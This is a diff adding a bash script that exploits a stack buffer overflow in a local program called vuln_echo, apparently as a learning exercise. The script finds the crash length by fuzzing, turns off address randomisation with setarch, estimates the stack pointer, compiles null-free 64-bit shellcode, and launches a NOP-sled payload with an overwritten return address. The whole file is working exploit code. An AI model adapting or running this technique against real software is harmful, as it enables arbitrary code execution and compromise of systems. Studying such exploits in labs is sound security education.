@@ -1,0 +1,70 @@
+#!/bin/bash
+
+if [ $# -ne 1 ]; then
+    echo 'Usage: ./hack_vuln_echo_nop_sled.bsh <initial stack offset>'
+    echo 'Suggestion: Try using an offset of approximately 200.'
+    exit 1
+fi
+
+stack_offset=$1
+stack_offset=$(echo "obase=16; ${stack_offset}" | bc)
+
+# Ensure shellcode object file is compiled
+gcc -c ~/asm/4-shell-code/shell_64_no_zeros.S -o ~/asm/shell_64_no_zeros.o
+
+# Find how large the argument needs to be to cause a buffer overflow
+for ((input_size=1; input_size<1024; ++input_size)); do
+    input=$(yes a | head -${input_size} | tr -d '\n')
+    ./vuln_echo "$input" >& /dev/null || break
+done
+
+echo "Failed with input of size ${input_size}"
+
+# Adjust input size to start overwriting return address
+input_size=$(echo "${input_size} + 8" | bc)
+
+# Estimate stack pointer
+gcc ~/asm/0-utils/get_stack_pointer.c -o ~/asm/0-utils/get_stack_pointer
+sp=$($(uname -m) -R ~/asm/0-utils/get_stack_pointer | head -1 | awk '{print $NF}' | sed 's/^0x//g')
+sp=$(echo "${sp^^}")  # Convert to uppercase for bc
+
+echo "External estimate of %rsp: $sp"
+
+# Calculate the new return address
+new_return_address_dec=$(echo "ibase=16; $sp - ${stack_offset}" | bc)
+new_return_address_hex=$(echo "obase=16; $new_return_address_dec" | bc)
+
+echo "Trying for new return address (unpacked): ${new_return_address_hex}"
+
+# Pack the new return address
+new_return_address_packed=$(./ptr2str 0x$new_return_address_hex)
+#new_return_address_packed=$(./ptr2str 0x7fffffffe010)
+
+
+echo "Trying for new return address (packed): ${new_return_address_packed}"
+
+# Prepare shellcode
+shell_block_unpacked=$(./obj_to_hex ~/asm/shell_64_no_zeros.o)
+python ~/asm/0-utils/hex2txt.py raw "${shell_block_unpacked}" > ~/asm/0-utils/shell_code
+
+shell_size=$(wc -c ~/asm/0-utils/shell_code | awk '{print $1}')
+
+# Calculate the number of NOPs
+number_of_nops=$(echo "${input_size} - ${shell_size}" | bc)
+
+echo "Using ${number_of_nops} NOPs"
+
+# Prepare NOP instruction (0x90)
+nop=$(python ~/asm/0-utils/hex2txt.py raw 90)
+
+# Reserve 14 bytes for frame pointer and padding
+reserved_suffix_size=14
+nop_prefix_block_size=$(echo "${number_of_nops} - ${reserved_suffix_size}" | bc)
+
+nop_prefix_block=$(yes "$nop" | head -${nop_prefix_block_size} | tr -d '\n')
+nop_suffix_block=$(yes "$nop" | head -${reserved_suffix_size} | tr -d '\n')
+
+# Combine components and exploit vuln_echo
+payload="${nop_prefix_block}$(cat ~/asm/0-utils/shell_code)${nop_suffix_block}${new_return_address_packed}"
+
+setarch $(uname -m) -R ./vuln_echo "${payload}"
